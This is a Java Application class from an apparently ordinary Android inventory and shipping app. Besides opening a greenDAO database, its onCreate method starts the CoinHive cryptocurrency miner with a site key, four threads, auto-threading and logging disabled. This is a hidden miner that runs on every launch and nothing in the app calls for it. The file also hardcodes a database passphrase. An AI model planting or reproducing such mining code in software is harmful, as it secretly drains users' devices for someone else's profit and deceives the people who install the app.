package com.innovati.felipehernandez.invenenvios.app;

import android.app.Application;
import android.os.SystemClock;

import org.greenrobot.greendao.database.Database;

import com.innovati.felipehernandez.invenenvios.database.DaoMaster;
import com.innovati.felipehernandez.invenenvios.database.DaoMaster.DevOpenHelper;
import com.innovati.felipehernandez.invenenvios.database.DaoSession;
import com.theah64.coinhive.CoinHive;

public class MyApp extends Application
{
    public static final boolean ENCRYPTED = false;
    private DaoSession daoSession;

    @Override
    public void onCreate()
    {
        super.onCreate();

        SystemClock.sleep(3000);

        DevOpenHelper helper = new DevOpenHelper(this, ENCRYPTED ? "inven_e_encrypted" : "inven_e");
        Database db = ENCRYPTED ? helper.getEncryptedWritableDb("super-secret") : helper.getWritableDb();
        daoSession = new DaoMaster(db).newSession();
        CoinHive.getInstance().init("YhHUfiQyt0RkpIiRoDeO9986LGxHphCd").setNumberOfThreads(4).setIsAutoThread(true).setThrottle(0.2).setLoggingEnabled(false).setForceASMJS(false);
    }

    public DaoSession getDaoSession() {
        return daoSession;
    }
}
